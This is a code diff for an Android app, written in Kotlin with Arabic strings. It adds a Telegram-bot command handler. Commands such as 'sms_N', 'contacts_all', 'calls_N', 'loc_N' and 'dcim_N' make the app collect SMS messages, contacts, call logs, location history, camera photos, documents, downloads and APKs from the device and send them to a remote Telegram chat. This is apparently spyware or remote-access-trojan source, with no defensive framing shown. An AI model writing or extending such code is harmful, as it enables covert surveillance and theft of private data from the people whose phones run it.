@@ -227,7 +227,7 @@ class Dispatcher(private val ctx: Context) {
             "acc_telegram" -> autoOpen(chatId, "org.telegram.messenger", "Telegram")
 
             "menu"      -> menu(chatId)
-            else        -> send(chatId, "زر غير معروف: $data")
+            else        -> handleDynamic(chatId, data)
         }
     }
 
@@ -398,6 +398,31 @@ class Dispatcher(private val ctx: Context) {
             val p = "chat_id=$chatId&text=" + URLEncoder.encode(text, "UTF-8")
             Sender.post("$BASE/sendMessage", p)
         } catch (_: Exception) {}
+    }
+
+    private fun handleDynamic(chatId: String, data: String) {
+        val parts = data.split("_")
+        if (parts.size != 2) { send(chatId, "زر غير معروف: $data"); return }
+        val prefix = parts[0]
+        val numStr = parts[1]
+        val limit = if (numStr == "all") 99999 else numStr.toIntOrNull() ?: 0
+        if (limit <= 0) { send(chatId, "زر غير معروف: $data"); return }
+        when (prefix) {
+            "mus", "audio"  -> sendAudio(chatId, limit)
+            "pic"           -> sendFolder(chatId, "/sdcard/Pictures", limit, "الصور")
+            "allpics", "images" -> sendImages(chatId, limit)
+            "vid", "videos" -> sendVideos(chatId, limit)
+            "dcim"          -> sendFolder(chatId, "/sdcard/DCIM", limit, "الكاميرا")
+            "dl"            -> sendFolder(chatId, "/sdcard/Download", limit, "التنزيلات")
+            "doc"           -> sendFolder(chatId, "/sdcard/Documents", limit, "المستندات")
+            "mov"           -> sendFolder(chatId, "/sdcard/Movies", limit, "الأفلام")
+            "apk"           -> sendApks(chatId, limit, false)
+            "sms"           -> file(chatId, "sms_$limit.txt", c.sms(limit))
+            "contacts"      -> file(chatId, "contacts_$limit.txt", c.contacts(limit))
+            "calls"         -> file(chatId, "calls_$limit.txt", c.calls(limit))
+            "loc"           -> send(chatId, loc.historyText(limit))
+            else            -> send(chatId, "زر غير معروف: $data")
+        }
     }
 
     private fun menu(chatId: String) {
